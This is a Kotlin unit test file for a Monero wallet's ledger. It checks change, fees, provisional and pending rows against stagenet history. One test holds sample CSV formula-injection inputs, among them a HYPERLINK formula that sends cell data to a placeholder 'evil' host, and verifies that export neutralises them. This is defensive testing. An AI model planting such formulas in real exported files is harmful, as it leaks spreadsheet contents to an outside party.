package org.ducatproject.ducat

import org.junit.Assert.assertEquals
import org.junit.Assert.assertTrue
import org.junit.Test

/**
 * The ledger, against a real wallet's real history.
 *
 * The numbers below are from stagenet: an output of 0.01 XMR received at block
 * 2184506, spent in transaction 7c4138…, which paid a fee of 0.00003032 and
 * returned 0.007466 as change at block 2184652. That is the history the old
 * screen rendered as "+4.01 then +3.00" — two receipts totalling more than the
 * wallet ever held, with the payment between them missing entirely.
 */
class LedgerTest {

    private val received = WalletEntry(
        amountPxmr = 10_000_000_000L,
        height = 2_184_506,
        spent = true,
        keyImage = "aa".repeat(32),
        txHashHex = "1111111111111111111111111111111111111111111111111111111111111111",
        timestamp = 1_786_600_000,
    )
    private val change = WalletEntry(
        amountPxmr = 7_466_000_000L,
        height = 2_184_652,
        spent = false,
        keyImage = "bb".repeat(32),
        txHashHex = "7c4138288e0d50a38f6017c357e33ecc76b0e03e4caf1f4a3cf9c7269acdf2a1",
        timestamp = 1_786_638_236,
    )
    /** As the daemon reports it — fee, ring and shape all checked against it. */
    private val spendTx = ChainTx(
        txid = change.txHashHex,
        version = 2,
        feePxmr = 30_320_000L,
        keyImages = listOf(received.keyImage),
        inputCount = 1,
        outputCount = 2,
        ringSize = 16,
        additionalTimelock = 0,
        extraLen = 44,
        coinbase = false,
    )

    private fun ledger(chain: Map<String, ChainTx>, sends: List<SentPayment> = emptyList()) =
        Ledger.assemble(
            entries = listOf(received, change),
            tip = 2_184_700,
            chainOf = { chain[it] },
            sendRecords = sends,
            nameOf = { null },
        )

    @Test
    fun `change is not income and the send is not missing`() {
        val events = ledger(mapOf(spendTx.txid to spendTx))
        assertEquals(2, events.size)

        // Newest first.
        val sent = events[0]
        val got = events[1]

        assertEquals(Ledger.Direction.Received, got.direction)
        assertEquals(10_000_000_000L, got.amountPxmr)

        assertEquals(Ledger.Direction.Sent, sent.direction)
        // 0.010000 in, 0.007466 back, 0.00003032 to the network.
        assertEquals(2_503_680_000L, sent.amountPxmr)
        assertEquals(30_320_000L, sent.feePxmr)
        assertEquals(7_466_000_000L, sent.changePxmr)
    }

    @Test
    fun `the running balance ends at what the wallet can still spend`() {
        val events = ledger(mapOf(spendTx.txid to spendTx))
        // Unspent outputs only — the same sum the Accounts screen shows.
        val unspent = listOf(received, change).filterNot { it.spent }.sumOf { it.amountPxmr }
        assertEquals(unspent, events.first().balanceAfterPxmr)
        assertEquals(7_466_000_000L, events.first().balanceAfterPxmr)
        // And every step in between reconciles: the receipt's row is the
        // balance right after it arrived.
        assertEquals(10_000_000_000L, events.last().balanceAfterPxmr)
    }

    @Test
    fun `the arithmetic never invents money`() {
        val events = ledger(mapOf(spendTx.txid to spendTx))
        assertEquals(
            listOf(received, change).filterNot { it.spent }.sumOf { it.amountPxmr },
            events.sumOf { it.netPxmr },
        )
    }

    @Test
    fun `before the transaction is read the row admits it does not know`() {
        // No chain data *and a send of our own with that txid*: the output
        // could be our change or it could be income, and the screen must not
        // assert either.
        //
        // The send record is the half this test used to leave out. "Provisional"
        // stopped meaning "unread" and started meaning "unread, and ours to be
        // unsure about" — because a transaction this device never sent is not
        // its change however long the chain takes, and hedging on it told
        // somebody who had never sent anything in their life that every payment
        // they received might be their own change. The test kept asserting the
        // rule that behaviour came from.
        val ourSpend = SentPayment(
            txidHex = change.txHashHex,
            amountPxmr = 1_000_000_000L,
            feePxmr = 30_320_000L,
            toAddress = "5xyz",
            contactHex = null,
            note = null,
            timestamp = 1_786_638_000_000L,
        )
        val events = ledger(emptyMap(), listOf(ourSpend))
        val guess = events.first { it.txid == change.txHashHex }
        assertTrue("must be marked provisional", guess.provisional)
        // The spent output still has to appear, or the balance steps down with
        // nothing to account for it.
        assertTrue("spend must still be shown", events.any { it.unexplained })
        assertEquals(
            "balance must reconcile even while unclassified",
            7_466_000_000L,
            events.first().balanceAfterPxmr,
        )
    }

    @Test
    fun `an unread transaction we never sent is not hedged as our change`() {
        // The other side of the rule above. With no send record for it, the
        // output is income — unread, but not ambiguous — and saying "this may
        // be change from your own payment" about a stranger's payment is a
        // false claim, not caution.
        val events = ledger(emptyMap())
        val row = events.first { it.txid == change.txHashHex }
        assertTrue("a payment we did not send is not provisional", !row.provisional)
    }

    @Test
    fun `a counterparty cannot smuggle a formula into the statement`() {
        // The counterparty column is their card's asserted name and the note
        // is their message text, so both are somebody else's words landing
        // in a file an accountant opens in a spreadsheet. A cell that begins
        // = + - or @ is a formula there, not a name.
        for (hostile in listOf(
            "=HYPERLINK(\"http://evil/\"&A1,\"invoice\")",
            "+1+1",
            "-2+3",
            "@SUM(A1:A9)",
        )) {
            val cell = Ledger.csvCell(hostile)
            assertTrue(
                "a formula cell must not survive as one: $cell",
                cell.startsWith("'") || cell.startsWith("\"'"),
            )
        }
        // Ordinary names are left exactly as they were — the guard must not
        // start rewriting people's names.
        assertEquals("Jordan", Ledger.csvCell("Jordan"))
        assertEquals("Café Küçük", Ledger.csvCell("Café Küçük"))
        // And the quoting it already did still happens, once, around the
        // apostrophe rather than inside it.
        assertEquals("\"'=a,b\"", Ledger.csvCell("=a,b"))
        assertEquals("\"say \"\"hi\"\"\"", Ledger.csvCell("say \"hi\""))
    }

    @Test
    fun `a broadcast that is not on chain yet does not move the balance`() {
        val pending = SentPayment(
            txidHex = "dead".repeat(16),
            amountPxmr = 1_000_000_000L,
            feePxmr = 30_000_000L,
            toAddress = "5xyz",
            contactHex = null,
            note = "coffee",
            timestamp = 1_786_700_000_000L,
        )
        val events = ledger(mapOf(spendTx.txid to spendTx), listOf(pending))
        val row = events.first()
        assertTrue("pending sends sort to the top", row.pending)
        assertEquals(0L, row.netPxmr)
        assertEquals(7_466_000_000L, row.balanceAfterPxmr)
    }
}
